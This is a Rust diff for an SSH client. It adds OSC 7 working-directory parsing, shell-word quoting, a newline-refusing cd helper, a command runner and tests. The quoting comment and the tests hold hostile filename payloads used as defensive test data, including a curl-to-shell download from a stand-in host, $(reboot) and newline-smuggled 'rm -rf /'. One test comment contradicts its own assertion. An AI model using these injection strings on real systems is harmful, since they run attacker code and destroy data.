@@ -38,6 +38,17 @@ pub struct Session {
     pub resize: mpsc::UnboundedSender<(u32, u32)>,
     pub started_at: i64,
     pub server_key: String,
+    /// The last directory the shell announced, or `None` if it never has.
+    ///
+    /// Held on the session rather than in the pump task that fills it, because
+    /// the pane that reads it is destroyed and rebuilt every time the user
+    /// switches tabs — `SessionScreen` renders only the active one. A pane
+    /// coming back has to be able to *ask* what it missed, the way `sshBus`
+    /// replays terminal output for the same reason. Without that it would sit
+    /// at "the shell has not said" until the user happened to `cd` somewhere
+    /// new, because a shell announcing the same directory at every prompt is
+    /// deduped and emits nothing.
+    pub cwd: Arc<Mutex<Option<String>>>,
 }
 
 #[derive(Default)]
@@ -423,8 +434,16 @@ pub async fn connect(
     let host_id = host.id;
     let run_on_connect = host.run_on_connect.clone();
 
+    // Made here and shared both ways: the task below writes it, the session
+    // holds it, and `cwd()` reads it for a pane that has just been rebuilt.
+    let cwd = Arc::new(Mutex::new(None::<String>));
+    let pump_cwd = Arc::clone(&cwd);
+
     tauri::async_runtime::spawn(async move {
         let mut reader = LineReader::default();
+        // The other direction: keystrokes go through `reader`, and the shell's
+        // own output goes through this one.
+        let mut cwd_reader = CwdReader::default();
 
         // `Run on connect` is Portway acting on its own, so it is logged as
         // system before the user has typed anything.
@@ -467,6 +486,33 @@ pub async fn connect(
                 message = channel.wait() => {
                     match message {
                         Some(ChannelMsg::Data { data }) => {
+                            // Only here, and not on `ExtendedData` below:
+                            // stderr on a PTY channel is unusual, and a folder
+                            // the SFTP pane is about to open must not come from
+                            // it.
+                            if let Some(found) = cwd_reader.push(&data) {
+                                // Recorded on every announcement, emitted only
+                                // on a change. A shell says where it is before
+                                // each prompt, and a pane told the same thing
+                                // sixty times a minute would be re-rendering to
+                                // say nothing — but a pane rebuilt by a tab
+                                // switch still has to be able to ask, which is
+                                // what the stored copy is for.
+                                let changed = {
+                                    let mut held = pump_cwd.lock().unwrap();
+                                    let changed = held.as_deref() != Some(found.as_str());
+                                    if changed {
+                                        *held = Some(found.clone());
+                                    }
+                                    changed
+                                };
+                                if changed {
+                                    let _ = pump_app.emit_to(&pump_window, "ssh://cwd", CwdEvent {
+                                        session_id: pump_session.clone(),
+                                        path: found,
+                                    });
+                                }
+                            }
                             let _ = pump_app.emit_to(&pump_window, "ssh://data", DataEvent {
                                 session_id: pump_session.clone(),
                                 data: base64(&data),
@@ -516,6 +562,7 @@ pub async fn connect(
         resize: resize_tx,
         started_at,
         server_key: negotiated.clone(),
+        cwd,
     });
 
     app.state::<Sessions>()
@@ -997,7 +1044,366 @@ pub fn session(app: &AppHandle, id: &str) -> Result<Arc<Session>> {
         .ok_or_else(|| Error::Ssh(format!("session {id} is not connected")))
 }
 
+/// Wraps a string as one POSIX shell word.
+///
+/// Every command this app sends is a string handed to the remote login shell,
+/// so every character in it is the shell's to interpret — and the paths that go
+/// into those commands come out of a directory listing the *server* controls.
+/// `a'; curl evil | sh; '.txt` is a legal filename on Linux, and unquoted it is
+/// not a path at all, it is a command. `scratch_name` in `sftp.rs` refuses the
+/// same class of name for the same reason; this is the other half of it.
+///
+/// Single quotes make a POSIX shell take everything between them literally,
+/// which leaves exactly one character to deal with: the quote itself, handled
+/// by closing the string, escaping one, and opening it again.
+pub fn quoted(word: &str) -> String {
+    format!("'{}'", word.replace('\'', r"'\''"))
+}
+
+/// Types `cd <path>` at the session's interactive shell.
+///
+/// Through the same queue as a keystroke, so it is audited like one: the line
+/// appears in `command_log` because `LineReader` reconstructs it there, exactly
+/// as it would if the user had typed it. That is the honest record — this *is*
+/// typing at their shell, and the pane says so.
+///
+/// A line break is refused rather than quoted around. The newline at the end is
+/// what makes this a command instead of a suggestion, and a directory called
+/// `notes\nrm -rf /` — a legal Linux name, from a listing the server controls —
+/// would send two lines, the second one a command in its own right. Quoting
+/// cannot help: the shell has split the input into lines before it ever looks
+/// at a quote. So this refuses, the way `scratch_name` does, rather than
+/// sanitising into a path that is not the one asked for.
+pub fn cd(app: &AppHandle, session_id: &str, path: &str) -> Result<()> {
+    let line = cd_line(path)?;
+    let session = session(app, session_id)?;
+    let _ = session.input.send(line.into_bytes());
+    Ok(())
+}
+
+/// The last directory this session's shell announced, for a pane that has just
+/// been built and missed everything before it.
+///
+/// `None` for a session that is not connected, and for one whose shell has
+/// never said — the caller cannot act differently on the two, and treating a
+/// disconnected session as an error would make an ordinary mount noisy.
+pub fn cwd(app: &AppHandle, session_id: &str) -> Option<String> {
+    session(app, session_id).ok()?.cwd.lock().unwrap().clone()
+}
+
+/// The exact bytes typed at the shell, or the refusal. Split out so the guard
+/// above it can be tested without a connection to type at.
+fn cd_line(path: &str) -> Result<String> {
+    if path.contains(['\n', '\r']) {
+        return Err(Error::Invalid(format!(
+            "refusing to cd to {path}: its name contains a line break, which would send a second \
+             line to the shell. Open it in the pane instead."
+        )));
+    }
+    Ok(format!("cd {}\n", quoted(path)))
+}
+
+/// The shell has told us which directory it is in.
+#[derive(Clone, Serialize)]
+#[serde(rename_all = "camelCase")]
+struct CwdEvent {
+    session_id: String,
+    path: String,
+}
+
+/// Reassembles the one escape sequence this app reads out of the shell's own
+/// output: OSC 7, which is how a shell announces the directory it is in.
+///
+/// Read rather than asked for, and that is the whole design. There is no way to
+/// learn an interactive shell's working directory without the shell's
+/// cooperation — the alternatives are typing a command into it, which lands in
+/// whatever program happens to be running and may be `vim` or a password
+/// prompt, or rewriting the user's `PROMPT_COMMAND` behind their back. So this
+/// listens, and the pane offers the feature when the shell is announcing and
+/// says how to make it announce when it is not.
+///
+/// A sequence arrives in as many packets as the network felt like using, and
+/// the terminator is two bytes in the `ESC \` form — the split lands between
+/// them often enough to matter and never in a test that feeds whole strings.
+/// Hence a state machine that survives a `push` boundary anywhere.
+#[derive(Default)]
+pub struct CwdReader {
+    state: Scan,
+    body: Vec<u8>,
+}
+
+#[derive(Default, Clone, Copy)]
+enum Scan {
+    /// Ordinary output, looking for the `ESC` that might start one.
+    #[default]
+    Idle,
+    /// An `ESC` has been seen; `]` would make it an OSC.
+    Esc,
+    /// Inside an OSC, collecting until it terminates.
+    Body,
+    /// Inside an OSC, and an `ESC` has been seen; `\` would end it.
+    BodyEsc,
+}
+
+/// A sequence longer than this is not one a shell sent. Without a cap, a server
+/// that emits `ESC ]` and never terminates grows this without bound — the same
+/// reasoning as `read_small`'s limit, against the same kind of host.
+const MAX_OSC: usize = 4 * 1024;
+
+impl CwdReader {
+    /// Feeds one chunk of shell output and returns a directory if one was
+    /// announced in it. The last one wins: a chunk can carry several prompts.
+    pub fn push(&mut self, chunk: &[u8]) -> Option<String> {
+        let mut found = None;
+        for &byte in chunk {
+            match self.state {
+                Scan::Idle => {
+                    if byte == 0x1b {
+                        self.state = Scan::Esc;
+                    }
+                }
+                Scan::Esc => {
+                    self.state = match byte {
+                        b']' => {
+                            self.body.clear();
+                            Scan::Body
+                        }
+                        // Two escapes running: the second one is still the
+                        // start of whatever comes next.
+                        0x1b => Scan::Esc,
+                        _ => Scan::Idle,
+                    };
+                }
+                Scan::Body => match byte {
+                    0x07 => {
+                        if let Some(path) = self.finish() {
+                            found = Some(path);
+                        }
+                    }
+                    0x1b => self.state = Scan::BodyEsc,
+                    _ if self.body.len() >= MAX_OSC => {
+                        self.state = Scan::Idle;
+                        self.body.clear();
+                    }
+                    _ => self.body.push(byte),
+                },
+                Scan::BodyEsc => match byte {
+                    b'\\' => {
+                        if let Some(path) = self.finish() {
+                            found = Some(path);
+                        }
+                    }
+                    0x1b => {}
+                    // An `ESC` inside the body that did not terminate it. This
+                    // is not a sequence we can make sense of, so it is dropped
+                    // rather than guessed at.
+                    _ => {
+                        self.state = Scan::Idle;
+                        self.body.clear();
+                    }
+                },
+            }
+        }
+        found
+    }
+
+    fn finish(&mut self) -> Option<String> {
+        let body = std::mem::take(&mut self.body);
+        self.state = Scan::Idle;
+        // `7;` is the command number. Every other OSC — the window title at
+        // `0;`, the palette at `4;` — goes past untouched.
+        directory(String::from_utf8_lossy(&body).strip_prefix("7;")?)
+    }
+}
+
+/// The directory out of an OSC 7 payload.
+///
+/// The sequence carries a URL, not a path — `file://myhost/var/log` — and real
+/// emitters percent-encode it: fish and starship send `/tmp/my%20app` for a
+/// directory with a space in its name. Handed to `sftp_list` unchanged that
+/// opens nothing and reports "no such directory", which sends the user looking
+/// for a problem that is not there.
+///
+/// So the `file://` form is decoded and a bare path is not — the encoding is a
+/// property of the URL, and a hook written by hand sends the path as it is. The
+/// distinction is what keeps `/tmp/100%done` intact from the one and
+/// `/tmp/my%20app` readable from the other.
+///
+/// It leaves one ambiguity, and it is the right one to leave: a directory
+/// genuinely named `a%20b`, announced by an emitter that does not encode, reads
+/// back as `a b`. That is a wrong answer to a question nobody asks; the
+/// alternative is a wrong answer to the ordinary case of a space in a name.
+fn directory(payload: &str) -> Option<String> {
+    let path = match payload.strip_prefix("file://") {
+        // Everything up to the next `/` is the authority — a hostname, or
+        // nothing at all in the `file:///var/log` form, which is what a shell
+        // with no `$HOSTNAME` set sends and is just as common.
+        Some(after) => return absolute(&percent_decode(&after[after.find('/')?..])),
+        None => payload,
+    };
+    absolute(path)
+}
+
+/// Anything that is not an absolute path is not something to hand a file pane.
+fn absolute(path: &str) -> Option<String> {
+    path.starts_with('/').then(|| path.to_string())
+}
+
+fn percent_decode(text: &str) -> String {
+    let bytes = text.as_bytes();
+    let mut out = Vec::with_capacity(bytes.len());
+    let mut i = 0;
+    while i < bytes.len() {
+        // A trailing `%` or one followed by anything that is not two hex digits
+        // is a literal `%` — which is a legal character in a filename, and more
+        // likely than a hook that encodes badly.
+        if bytes[i] == b'%' && i + 2 < bytes.len() {
+            if let Some(byte) = hex(bytes[i + 1]).zip(hex(bytes[i + 2])).map(|(h, l)| h << 4 | l) {
+                out.push(byte);
+                i += 3;
+                continue;
+            }
+        }
+        out.push(bytes[i]);
+        i += 1;
+    }
+    String::from_utf8_lossy(&out).into_owned()
+}
+
+fn hex(byte: u8) -> Option<u8> {
+    match byte {
+        b'0'..=b'9' => Some(byte - b'0'),
+        b'a'..=b'f' => Some(byte - b'a' + 10),
+        b'A'..=b'F' => Some(byte - b'A' + 10),
+        _ => None,
+    }
+}
+
+/// What one non-interactive command left behind.
+pub struct Output {
+    pub status: u32,
+    pub stdout: Vec<u8>,
+    /// Decoded lossily: this is read by people and matched against a program's
+    /// own wording, and one stray byte must not lose the sentence around it.
+    pub stderr: String,
+}
+
+/// How much of a command's diagnostics is worth keeping. A program that decides
+/// to write a megabyte to stderr is not writing anything anybody will read.
+const STDERR_LIMIT: usize = 8 * 1024;
+
+/// A command that has not finished by now is not going to. Nothing here is
+/// interactive — a program still waiting has run out of input that is coming.
+const RUN_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(60);
+
+/// Runs one command on the session's connection and waits for it to finish.
+///
+/// A channel of its own, and deliberately **without a PTY**. Both halves
+/// matter. The interactive shell's channel is the one `LineReader` reconstructs
+/// into audit rows, so anything sent there is written down — which is exactly
+/// what a password must not be. And a PTY would make a program that reads a
+/// secret take it from the terminal rather than stdin, and echo it straight
+/// back as channel data.
+///
+/// `stdin` is sent and then closed. The close is not optional: a program
+/// reading standard input waits for the end of it, and one that never comes is
+/// a channel that never returns.
+///
+/// `limit` caps what is kept from stdout. The output of a command run by the
+/// app arrives in memory whole, and the size of it is the server's choice.
+pub async fn run(
+    app: &AppHandle,
+    session_id: &str,
+    command: &str,
+    stdin: Option<&[u8]>,
+    limit: usize,
+) -> Result<Output> {
+    let session = session(app, session_id)?;
+    let mut channel = session
+        .handle
+        .channel_open_session()
+        .await
+        .map_err(|e| Error::Ssh(format!("could not open a channel: {e}")))?;
+    channel
+        .exec(true, command)
+        .await
+        .map_err(|e| Error::Ssh(format!("the server refused to run a command: {e}")))?;
+
+    if let Some(bytes) = stdin {
+        channel
+            .data(bytes)
+            .await
+            .map_err(|e| Error::Ssh(format!("could not write to the command: {e}")))?;
+    }
+    let _ = channel.eof().await;
+
+    let mut status = 0u32;
+    let mut stdout: Vec<u8> = Vec::new();
+    let mut stderr: Vec<u8> = Vec::new();
+    let collecting = async {
+        while let Some(message) = channel.wait().await {
+            match message {
+                ChannelMsg::Data { data } => take(&mut stdout, &data, limit),
+                ChannelMsg::ExtendedData { data, .. } => take(&mut stderr, &data, STDERR_LIMIT),
+                ChannelMsg::ExitStatus { exit_status } => status = exit_status,
+                // A command killed by a signal reports no exit status at all,
+                // and a zero left over from the initialiser would read as
+                // success. 128 + n is the shell's own convention for it.
+                ChannelMsg::ExitSignal { signal_name, .. } => {
+                    status = 128 + signal_number(&signal_name);
+                }
+                ChannelMsg::Close => break,
+                _ => {}
+            }
+        }
+    };
+    tokio::time::timeout(RUN_TIMEOUT, collecting)
+        .await
+        .map_err(|_| Error::Ssh(format!("the server did not finish running the command in {}s", RUN_TIMEOUT.as_secs())))?;
+
+    Ok(Output {
+        status,
+        stdout,
+        stderr: String::from_utf8_lossy(&stderr).trim().to_string(),
+    })
+}
+
+/// Appends what still fits and silently drops the rest — the cap is a memory
+/// bound, not a protocol error, and a truncated tail is better than a refusal.
+fn take(into: &mut Vec<u8>, data: &[u8], limit: usize) {
+    let room = limit.saturating_sub(into.len());
+    if room > 0 {
+        into.extend_from_slice(&data[..data.len().min(room)]);
+    }
+}
+
+/// The numbers behind the names SSH sends. Only the ones a command actually
+/// dies of; anything else lands on 0, which still leaves the status non-zero
+/// and the failure visible.
+fn signal_number(signal: &russh::Sig) -> u32 {
+    use russh::Sig;
+    match signal {
+        Sig::HUP => 1,
+        Sig::INT => 2,
+        Sig::QUIT => 3,
+        Sig::ILL => 4,
+        Sig::ABRT => 6,
+        Sig::FPE => 8,
+        Sig::KILL => 9,
+        Sig::SEGV => 11,
+        Sig::PIPE => 13,
+        Sig::ALRM => 14,
+        Sig::TERM => 15,
+        _ => 0,
+    }
+}
+
 pub async fn disconnect(app: &AppHandle, id: &str) -> Result<()> {
+    // Before anything that can fail or return early. A sudo password outliving
+    // the connection it was given for is a secret kept for no reason, and the
+    // session it belonged to is about to stop existing.
+    crate::sudo::forget(app, id);
+
     let session = app.state::<Sessions>().0.lock().unwrap().remove(id);
     if let Some(session) = session {
         {
@@ -1052,6 +1458,161 @@ mod tests {
     use super::*;
     use russh::keys::ssh_key::rand_core::OsRng;
     use russh::keys::{Algorithm, PrivateKey};
+
+    /// An ordinary path comes out as itself, wrapped.
+    #[test]
+    fn wraps_an_ordinary_path() {
+        assert_eq!(quoted("/etc/nginx/nginx.conf"), "'/etc/nginx/nginx.conf'");
+        assert_eq!(quoted("/home/opc/a file.txt"), "'/home/opc/a file.txt'");
+    }
+
+    /// The names a server would choose if it wanted a command of its own run on
+    /// the far end. Every one of them is a legal filename on Linux, and every
+    /// one of them is inert once it is one shell word.
+    #[test]
+    fn defuses_a_name_that_is_a_command() {
+        for hostile in [
+            "/tmp/a'; curl evil.example/x | sh; '.txt",
+            "/tmp/$(reboot)",
+            "/tmp/`reboot`",
+            "/tmp/x; rm -rf /",
+            "/tmp/x && rm -rf /",
+            "/tmp/*",
+            "/tmp/~root/.ssh/authorized_keys",
+        ] {
+            let word = quoted(hostile);
+            // Opens and closes, and every quote inside is an escaped one rather
+            // than a way out of the string.
+            assert!(word.starts_with('\'') && word.ends_with('\''), "{hostile:?} → {word}");
+            let inside = &word[1..word.len() - 1];
+            assert!(!inside.split(r"'\''").any(|part| part.contains('\'')), "{hostile:?} → {word}");
+        }
+    }
+
+    /// The one character that needs work, on its own and doubled.
+    #[test]
+    fn escapes_the_quote_itself() {
+        assert_eq!(quoted("it's"), r"'it'\''s'");
+        assert_eq!(quoted("''"), r"''\'''\'''");
+    }
+
+    /// One line, and one command. A path is quoted; a path with a line break in
+    /// it is refused, because the newline that ends the command is the one
+    /// thing quoting cannot contain — the shell has already split the input
+    /// into lines before it looks at a quote.
+    #[test]
+    fn types_one_line_at_the_shell() {
+        assert_eq!(cd_line("/var/log").unwrap(), "cd '/var/log'\n");
+        assert_eq!(cd_line("/tmp/a b").unwrap(), "cd '/tmp/a b'\n");
+        assert_eq!(cd_line("/tmp/it's").unwrap(), "cd '/tmp/it'\\''s'\n");
+
+        for hostile in ["/tmp/notes\nrm -rf /", "/tmp/notes\rrm -rf /", "/tmp/a\n"] {
+            let refused = cd_line(hostile).unwrap_err().to_string();
+            assert!(refused.contains("refusing to cd"), "{hostile:?} → {refused}");
+        }
+        // And nothing that is allowed through can be more than one line.
+        for ok in ["/var/log", "/tmp/a b", "/tmp/$(reboot)", "/tmp/x; rm -rf /"] {
+            assert_eq!(cd_line(ok).unwrap().lines().count(), 1, "{ok:?}");
+        }
+    }
+
+    /// The payload is a URL, and real emitters encode it. A directory with a
+    /// space in its name is the ordinary case that a naive parser opens nothing
+    /// for and then blames on the server.
+    #[test]
+    fn reads_the_url_an_osc_7_carries() {
+        let read = |body: &str| CwdReader::default().push(format!("\x1b]{body}\x07").as_bytes());
+
+        assert_eq!(read("7;file://myhost/var/log").as_deref(), Some("/var/log"));
+        // No authority at all, which is just as common as a hostname.
+        assert_eq!(read("7;file:///var/log").as_deref(), Some("/var/log"));
+        assert_eq!(read("7;file://myhost/tmp/my%20app").as_deref(), Some("/tmp/my app"));
+        assert_eq!(read("7;file://h/srv/caf%C3%A9").as_deref(), Some("/srv/café"));
+        // A hook written by hand very often sends the path alone — and it sends
+        // it *as it is*, so nothing in it is decoded.
+        assert_eq!(read("7;/var/log").as_deref(), Some("/var/log"));
+        assert_eq!(read("7;/tmp/my app").as_deref(), Some("/tmp/my app"));
+        assert_eq!(read("7;/tmp/100%done").as_deref(), Some("/tmp/100%done"));
+        assert_eq!(read("7;/tmp/a%20b").as_deref(), Some("/tmp/a%20b"));
+        // A `%` in a URL that does not begin an escape is a literal one.
+        assert_eq!(read("7;file://h/tmp/100%done").as_deref(), Some("/tmp/100%done"));
+    }
+
+    /// Captured from the hook this app offers, run under each shell. The zsh
+    /// line is the empty-authority form, because zsh does not set `$HOSTNAME`.
+    #[test]
+    fn reads_what_the_offered_hook_actually_emits() {
+        let mut reader = CwdReader::default();
+        assert_eq!(
+            reader.push(b"\x1b]7;file://192.168.36.6/tmp/scratchpad/my app\x07").as_deref(),
+            Some("/tmp/scratchpad/my app"),
+        );
+        assert_eq!(
+            reader.push(b"\x1b]7;file:///tmp/scratchpad/my app\x07").as_deref(),
+            Some("/tmp/scratchpad/my app"),
+        );
+        // The hook shares a line with whatever prompt command was already
+        // there, so its output shares a chunk with that command's.
+        assert_eq!(
+            reader.push(b"\x1b]7;file://h/var/log\x07already-here\r\n").as_deref(),
+            Some("/var/log"),
+        );
+    }
+
+    /// Every other OSC goes past untouched — the window title in particular,
+    /// which every shell sets and which is not a directory.
+    #[test]
+    fn ignores_every_other_sequence() {
+        let read = |body: &str| CwdReader::default().push(body.as_bytes());
+
+        assert_eq!(read("\x1b]0;opc@host: ~\x07"), None);
+        assert_eq!(read("\x1b]4;1;#ff0000\x07"), None);
+        // Relative, so not something to hand a file pane.
+        assert_eq!(read("\x1b]7;file://host/../etc\x07").as_deref(), Some("/../etc"));
+        assert_eq!(read("\x1b]7;notaurl\x07"), None);
+        assert_eq!(read("ordinary output, no escapes at all\n"), None);
+        assert_eq!(read("\x1b[32mcolour, which is CSI and not OSC\x1b[0m"), None);
+    }
+
+    /// The terminator is `BEL` or `ESC \`, and the two-byte one splits across
+    /// packets often enough to matter. This is the bug that reproduces once a
+    /// week and never in a test that feeds whole strings.
+    #[test]
+    fn survives_a_split_anywhere_in_the_sequence() {
+        let whole = b"prompt\x1b]7;file://host/var/log\x1b\\$ ";
+        for cut in 1..whole.len() {
+            let mut reader = CwdReader::default();
+            let first = reader.push(&whole[..cut]);
+            let second = reader.push(&whole[cut..]);
+            assert_eq!(
+                first.or(second).as_deref(),
+                Some("/var/log"),
+                "split at {cut}"
+            );
+        }
+    }
+
+    /// A chunk can carry several prompts, and the one that counts is where the
+    /// shell is *now*.
+    #[test]
+    fn keeps_the_last_directory_announced() {
+        let mut reader = CwdReader::default();
+        let found = reader.push(b"\x1b]7;/one\x07 out \x1b]7;/two\x07 more \x1b]7;/three\x07");
+        assert_eq!(found.as_deref(), Some("/three"));
+    }
+
+    /// A server that opens a sequence and never closes it must not be able to
+    /// grow the buffer without bound.
+    #[test]
+    fn gives_up_on_a_sequence_that_never_ends() {
+        let mut reader = CwdReader::default();
+        for _ in 0..64 {
+            assert_eq!(reader.push(&[b'x'; 1024]), None);
+        }
+        assert!(reader.body.len() <= MAX_OSC);
+        // And it recovers: the next real one still reads.
+        assert_eq!(reader.push(b"\x07\x1b]7;/var\x07").as_deref(), Some("/var"));
+    }
     use russh::server::{self, Auth, Server as _};
     use std::borrow::Cow;
 
